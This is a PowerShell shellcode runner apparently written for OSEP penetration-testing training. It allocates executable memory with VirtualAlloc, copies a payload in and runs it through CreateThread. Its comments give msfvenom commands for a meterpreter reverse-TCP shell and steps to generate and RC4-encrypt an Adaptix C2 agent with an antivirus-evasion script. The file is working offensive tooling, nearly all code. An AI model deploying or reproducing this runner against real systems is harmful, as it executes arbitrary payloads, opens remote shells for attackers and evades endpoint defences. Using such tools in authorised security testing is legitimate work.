#Requires -Version 2
<#
.SYNOPSIS  OSEP - Local shellcode runner (VirtualAlloc + CreateThread)
.NOTES     Replace $sc with msfvenom output:
           msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f ps1
           Run: . .\shellcode_runner.ps1; Invoke-ShellcodeRunner
#>

$LOG = "C:\Windows\Temp\osep_log.txt"

function Write-Log {
    param([string]$msg, [string]$level = "INFO")
    $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $line = "[$ts][$level][ShellcodeRunner] $msg"
    try { Add-Content -Path $LOG -Value $line -EA SilentlyContinue } catch {}
}

# Win32 API imports via Add-Type (compile once per session)
function Import-WinAPI {
    if (-not ([System.Management.Automation.PSTypeName]'WinAPI').Type) {
        try {
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, UIntPtr dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFree(
        IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@ -ErrorAction Stop
            Write-Log "Win32 API types compiled OK"
        } catch {
            Write-Log "Add-Type failed: $_" "ERROR"
            return $false
        }
    }
    return $true
}

function Invoke-ShellcodeRunner {
    param(
        # Paste msfvenom -f ps1 byte array here, or pass as argument
        [byte[]]$Shellcode
    )

    Write-Log "Invoke-ShellcodeRunner called. Shellcode size: $($Shellcode.Count) bytes"

    if ($Shellcode.Count -eq 0) {
        Write-Log "No shellcode provided — aborting" "ERROR"
        return
    }

    if (-not (Import-WinAPI)) { return }

    # Allocate RWX memory
    $MEM_COMMIT_RESERVE = 0x3000
    $PAGE_EXECUTE_READWRITE = 0x40

    Write-Log "Allocating $($Shellcode.Count) bytes RWX memory"
    $addr = [WinAPI]::VirtualAlloc(
        [IntPtr]::Zero,
        [UIntPtr][uint64]$Shellcode.Count,
        $MEM_COMMIT_RESERVE,
        $PAGE_EXECUTE_READWRITE
    )

    if ($addr -eq [IntPtr]::Zero) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Log "VirtualAlloc failed. Win32Error=$err" "ERROR"
        return
    }
    Write-Log "Memory allocated at 0x$($addr.ToString('X'))"

    # Copy shellcode into allocated memory
    try {
        [Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $addr, $Shellcode.Count)
        Write-Log "Shellcode copied to memory"
    } catch {
        Write-Log "Marshal.Copy failed: $_" "ERROR"
        [WinAPI]::VirtualFree($addr, [UIntPtr]::Zero, 0x8000) | Out-Null
        return
    }

    # Create thread pointing at shellcode
    Write-Log "Creating thread at shellcode address"
    $thread = [WinAPI]::CreateThread(
        [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero
    )

    if ($thread -eq [IntPtr]::Zero) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Log "CreateThread failed. Win32Error=$err" "ERROR"
        [WinAPI]::VirtualFree($addr, [UIntPtr]::Zero, 0x8000) | Out-Null
        return
    }

    Write-Log "Thread created. Handle=0x$($thread.ToString('X')). Waiting for completion."
    [WinAPI]::WaitForSingleObject($thread, 0xFFFFFFFF) | Out-Null
    Write-Log "Thread completed"
}

# ---- PASTE YOUR SHELLCODE HERE ----
# Adaptix C2 workflow:
#   1. In Adaptix UI: Listeners → New → HTTPS  then  Agents → Generate → Raw Binary
#   2. Save as adaptix_agent.bin
#   3. Encrypt: python3 ../evasion/av_evasion.py rc4 "YourKey" adaptix_agent.bin runner.ps1
#   4. Or pipe raw bytes directly:
#      $buf = [IO.File]::ReadAllBytes("C:\path\to\adaptix_agent.bin")
#      Invoke-ShellcodeRunner -Shellcode $buf
#
# msfvenom fallback:
#   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f ps1 | clip
